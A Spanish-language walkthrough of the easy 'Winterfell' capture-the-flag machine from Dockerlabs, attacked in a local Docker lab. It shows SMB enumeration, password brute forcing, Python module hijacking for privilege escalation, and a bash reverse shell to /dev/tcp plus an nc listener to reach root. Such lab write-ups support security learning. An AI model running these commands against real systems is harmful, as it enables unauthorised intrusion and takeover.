# Máquina Winterfell

Dificultad -> Fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio
 Una vez descargada la máquina, debemos realizar los siguientes pasos para tener acceso a la máquina:
 
 En primer lugar veremos que tenemos descargado un zip con dos archivos un .sh y un .tar.
 
 ### Archivos
 
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Archivo que agrupa otros archivos/carpetas.

Para el despliegue de la máquina tendremos que ejecutar el siguiente comando:
```shell
sudo bash auto_deploy.sh winterfell.tar
```

Obtenemos la IP de la máquina:
<img width="832" height="624" alt="imagen" src="https://github.com/user-attachments/assets/048f1bc2-b4e5-4a8d-8b86-d0c120da761d" />



<br>

Como siempre empezamos escaneando la máquina objetivo:
```bash
nmap -sCV -p- --open --min-rate 5000 172.17.0.2 -vvv
```
Nos encontramos lo siguiente:
<img width="1581" height="802" alt="imagen" src="https://github.com/user-attachments/assets/1a499875-eaff-4f55-a9c5-c61d34204897" />


Comprobamos que es una máquina Linux. Vemos una versión de SSh que de primeras no parece de las vulnerables, una web HTTP en Apache con título Juego de Tronos, y dos servicios Samba corriendo. Reocrdamos que Samba es la versión SMB que utiliza Linux. 

Vamos a empezar primero por ver y enumerar la web. Esto es la web que vemos:


<img width="1593" height="773" alt="imagen" src="https://github.com/user-attachments/assets/f143cf3f-9fca-44c4-b9f4-db6735f9647f" />



Tenemos una simple web con varios nombres y un audio a reproducir. Los nombres puede ser de utilidad, los podemos guardar en una lista por si acaso:
```bash
nano users.txt
jon
arya
daenerys
```
También le debemos echar un vistazo al código fuente. Cómo tal no encontramos nada. Vamos a hacer fuzzing para encontrar rutas en la web. Voy a usar dirbuster:

<img width="731" height="245" alt="imagen" src="https://github.com/user-attachments/assets/3153bce0-0c85-416e-8de5-e2d39572f388" />

Tras usar dirbuster vemos que nso encuentra una ruta con código 200: /dragon. Vamos a acceder a ella:

<img width="405" height="190" alt="imagen" src="https://github.com/user-attachments/assets/47536cc7-c87e-4a47-af76-38328d88bb73" />

Accedemos al archivo ese "EpisodiosT1" y nos encontramos otra wordlist:

<img width="694" height="186" alt="imagen" src="https://github.com/user-attachments/assets/f1747dbb-b62b-41e8-820a-9c412a27226f" />

Vamos a añadir estos nombres a los anteriores:

<img width="660" height="439" alt="imagen" src="https://github.com/user-attachments/assets/8286a947-bef9-4268-8b95-c58b945a8b53" />

Parece que en la web no podemos acceder a mucho más. Con lo que tenemos podemos hacer varias cosas. Lo primero sería enumerar los recursos Samba y comprobar recursos compartidos. Podríamos probar fuerza bruta en Samba con estos usuarios que tenemos para ver si alguno existe en el servidor. Podremos aplicar también fuerza bruta de los usuarios sobre el servicio SSH:
```bash
smbclient -L //172.17.0.2 -N   # probar a listar y entrar con null session
smbmap -H 172.17.0.2
enum4linux -a 172.17.0.2
```

Encontramos recursos interesantes con smbclient pese a no poder acceder a ellos con una null session:

<img width="1541" height="337" alt="imagen" src="https://github.com/user-attachments/assets/8439b0de-6eb9-45eb-9347-2b722af9fd67" />

Con smbmap listamos los permisos de los recursos:

<img width="1411" height="209" alt="imagen" src="https://github.com/user-attachments/assets/aabafd70-e169-40c4-9147-9d06c2b7e397" />

Y con enum4linux conseguimos enumerar usuarios existentes en el sistema:

<img width="1350" height="290" alt="imagen" src="https://github.com/user-attachments/assets/6b637ffd-bc18-4806-b22c-740b84aa0583" />

Y vemos que son precisamente los usuarios de la web que anotamos. Podemos usar ahora herramientas como crackmapexec o netexec para hacer fuerza bruta:

Hice dos intentos distintos porque si que es verdad que el contenido de EpisodiosT1 puede parecer más una wordlist de passwords que de users. Por tanto probé de las dos formas y también hice un users2.txt solo con los 3 usuarios de smb:
```bash
nano users2.txt

jon
arya
daenerys


nano passwords.txt

as
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

```bash
nxc smb 172.17.0.2 -u users2.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
nxc smb 172.17.0.2 -u users2.txt -p passwords.txt
```

En ambos encontré credenciales:

<img width="1585" height="134" alt="imagen" src="https://github.com/user-attachments/assets/7aca90e9-3941-4163-a0a4-52af4f94bce9" />

<br>

<img width="1582" height="109" alt="imagen" src="https://github.com/user-attachments/assets/6023035d-95ad-4ea1-9ce5-6b9ea3d9f957" />

Tenemos passwords para jon y arya: 

- jon:seacercaelinvierno
- arya:123456

Ahora podemos enumerar que que permisos tienen estos users en recursos compartidos de Samba:

```bash
# jon
nxc smb 172.17.0.2 -u jon -p 'seacercaelinvierno' --shares

# arya
nxc smb 172.17.0.2 -u arya -p '123456' --shares
```

<img width="1579" height="515" alt="imagen" src="https://github.com/user-attachments/assets/0a4aa4e6-4f2e-4ac8-84dd-3584ff89b9d1" />

Por tanto el usuario interesante aquí parece Jon. Vamos a entrar a su recurso compartido:

<img width="1131" height="607" alt="imagen" src="https://github.com/user-attachments/assets/d87fed59-e6e7-49cb-a295-8f41d95bd5c3" />

Nos traemos los archivos relevantes a Kali.

Esto es lo que contienen:
<img width="1090" height="695" alt="imagen" src="https://github.com/user-attachments/assets/68da19ad-ce3e-4d46-811e-b0cb8c9b8fce" />

El bash history tambien puede ser interesante:
<img width="556" height="338" alt="imagen" src="https://github.com/user-attachments/assets/30523543-7cf9-4052-80ba-d47732a14a53" />


- paraJon → dice que Jon tiene una herramienta oculta para encriptar mensajes.
- .mensaje.py → solo calcula el SHA-256 de un mensaje y solo pueden ejecutarlo jon o aria.
- .bash_history → muestra que Jon ejecutaba .mensaje.py, pero no aparece ninguna otra herramienta.


Vale, ahora vamos a acceder al recurso que tenía permisos de escritura jon: shared:
```bash
smbclient //172.17.0.2/shared -U 'jon'
```

<img width="1540" height="507" alt="imagen" src="https://github.com/user-attachments/assets/a99fb5be-ae3d-45bc-9067-88544d87262b" />

Nos proporcionan una password cifrada. Podemos intuir que es base64:

- Usa solo letras A-Z, a-z, números y algunos símbolos permitidos.
- Termina en = → es un padding muy típico de Base64.
- Su longitud encaja con bloques de 4 caracteres.

```bash
echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
```
<img width="490" height="79" alt="imagen" src="https://github.com/user-attachments/assets/01da2190-ebe3-47dc-88df-980fe5806b4a" />

Obtenemos una password. Puede que sea de Daenerys. Podemos intentar comprobarlo:
```bash
nxc smb 172.17.0.2 -u daenerys -p 'hijodelanister' --shares
```

Efectivamente es la password de Daenerys:
<img width="1595" height="251" alt="imagen" src="https://github.com/user-attachments/assets/672db929-b342-46e6-949f-fa7ea6701780" />


Parece que en Samba no hay mucho más por probar. Arya y Daenerys no tienen acceso a nada y Jon ya lo hemos comprobado. Quizás alguna de las passwords obtenidas es la password que permite el acceso a ssh de alguno. Tras probae encontramos que `hijodelanister` es la password de jon en ssh:
```bash
ssh jon@172.17.0.2
```

**Escalada de privilegios**

Nos falta escalar privs en la sesión ssh.

Lo primero es mirar `etc/passwd` para ver si encontramos los usuarios anteriores:

<img width="744" height="545" alt="imagen" src="https://github.com/user-attachments/assets/47709163-4920-40e6-a8ab-277421d2daf6" />

Efectivamente los encontramos. Podemos probar los distintos comandos de escalada. Entre ellos obtenemos algo interesante:
<img width="1214" height="134" alt="imagen" src="https://github.com/user-attachments/assets/47fdd2a4-ed4d-4418-ad65-615fcc864679" />

| Jon puede ejecutar .mensaje.py como aria sin introducir contraseña y aria tiene un binario de python que le permite ejecutar comandos como si fuese sudo.

El problema es que .mensaje.py está pensado para ejecutar solamente el código del script. Pero como podemos modificarlo, podemos aprovechar Python para ejecutar comandos como aria.
```bash
ls -l /home/jon/.mensaje.py
```
No tenemos permisos de escritura. pero podemos ver el script:
<img width="925" height="526" alt="imagen" src="https://github.com/user-attachments/assets/8cce3c34-3dfc-48f4-9ab0-5639a2c4de50" />

`getpass` es un módulo de Python. Si conseguimos que Python cargue un getpass.py controlado por Jon en lugar del módulo legítimo, podríamos conseguir ejecución como aria:
```bash
touch getpass.py
ls -l getpass.py

nano getpass.py

import os
os.system("/bin/bash")
```

Si ejecutamos el script de antes como aria somos aria:
```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```

<img width="801" height="76" alt="imagen" src="https://github.com/user-attachments/assets/d548e891-cc1d-43e3-a79d-62c5e8b1b0bc" />

Volvemos a hacer `sudo -l` y nos encontramos algo similar:

<img width="1225" height="144" alt="imagen" src="https://github.com/user-attachments/assets/7581966a-181d-4124-a285-52b47c0ea579" />

Podemos ejecutar:
```bash
sudo -u daenerys cat ...
sudo -u daenerys ls ...
```
Pero no una bash. Por tanto podemos ver sus archivos y leerlos:


<img width="1546" height="411" alt="imagen" src="https://github.com/user-attachments/assets/6883d3ac-1ff7-4fb6-8c80-af4f25e2b1ba" />

Nos da una password que usaremos luego:
```bash
su daenerys
```

Vamos a seguir leyendo archivos:
```bash
sudo -u daenerys /usr/bin/ls -la /home/daenerys/.secret
```
<img width="914" height="217" alt="imagen" src="https://github.com/user-attachments/assets/882ecb4b-81c9-4a1a-bdb1-ff14fdb4ed89" />

Se puede ver ya desde el usuario daenerys:

<img width="742" height="136" alt="imagen" src="https://github.com/user-attachments/assets/af17b253-c81c-4448-a15a-1f89a37bfacc" />

Además si probamos `sudo -l` nos lleva a ese script también.

Esto significa que Daenerys puede ejecutar ese script como cualquier usuario, incluido root, sin contraseña. Por tanto si ejecutamos esa reverse shell y recibimos la conexión, seremos root:
```bash
nano /home/daenerys/.secret/.shell.sh

bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

En otra sesión:
```bash
nc -lnvp 443
```

Ejecutar:
```bash
sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Somos root:

<img width="670" height="184" alt="imagen" src="https://github.com/user-attachments/assets/88e3be2d-da94-478e-9362-27d6b462401c" />

Hemos completado la máquina!
